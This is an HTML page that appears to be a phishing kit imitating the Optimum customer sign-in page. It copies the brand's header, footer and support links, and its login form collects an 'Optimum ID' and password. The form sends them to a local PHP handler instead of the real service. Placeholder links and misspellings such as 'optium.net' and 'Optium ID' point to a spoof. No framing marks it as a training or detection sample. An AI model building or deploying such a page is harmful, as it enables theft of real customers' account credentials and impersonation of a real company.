<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="./css/style.css">
    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <title>Sign In to Manage Your Services | Optimum</title>
</head>
<body>
    <header>
        <div class="container">
            <div class="header-top">
                <div class="header-top-lang">
                    <a target="_blank" href="#">En español</a>
                </div>
                <div class="header-top-links">
                    <a target="_blank" href="#">Sign In</a>
                    <a target="_blank" href="#">Pay Bill</a>
                    <a target="_blank" href="#">Support</a>
                    <input  type="text" placeholder="Search support">
                </div>
            </div>
            <div class="header-bottom">
                <div class="header-bottom__logo">
                    <a href="#"><img src="./img/logo_desktop.png" alt="Logo"></a>
                </div>
                <div class="header-bottom-links">
                    <a target="_blank" href="#">Internet</a>
                    <a target="_blank" href="#">TV</a>
                    <a target="_blank" href="#">Phone</a>
                    <a target="_blank" href="#">My Offers</a>
                </div>
            </div>
        </div>
    </header>
    <main>
        <h1><div class="container">Optimum Sign In</div></h1>
        <div class="container sign-in-container">
            <div class="sign-in">
                <form action="./sign-in.handler.php">
                    <div class="form-group">
                        <label for="login">My Optimum ID</label>
                        <div class="row">
                            <input required id="login" name="login" type="text">
                            <a href="#sfdfsd#">I forgot my Optimum ID</a>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="Password">Password</label>
                        <div class="row">
                            <input required id="Password" name="password" type="Password">
                            <a href="#23sdfwefwefsdf">I forgot my password</a>
                        </div>
                    </div>
                    <hr>
                    <input type="submit" class="submit-btn" value="Sign in to optium.net">
                </form>
            </div>
            <div class="register">
                <h2>Don't have an Optimum ID?</h2>
                <p>An Optimum ID is a unique username that provides access to extra services and benefits.</p>
                <a href="#">Create an Optium ID</a>
            </div>
        </div>
    </main>

<footer>
    <div class="container">
        <div class="footer-top">
            <a href="#"><i class="fal fa-comment-alt"></i> Message Us</a>
            <a href="#"><i class="fab fa-twitter"></i> @OptiumHelp</a>
            <a href="#"><i class="fas fa-store"></i> Optium Stores</a>
        </div>
        <div class="hr"></div>
        <div class="footer-links">
            <a href="#">Report Abuse</a>
            <a href="#">Accessibility</a>
            <a href="#">Storm Preparedness </a>
            <a style="border-right: 0; margin-left: 5px;" href="#">Legal Compliance</a>
        </div>
        <div class="footer-links">
            <a href="#">Service Terms & Info</a>
            <a href="#">Copyright Policy</a>
            <a style="border-right: 0; margin-left: 5px;" href="#">Privacy Notice</a>
        </div>
    </div>
</footer>
</body>
</html>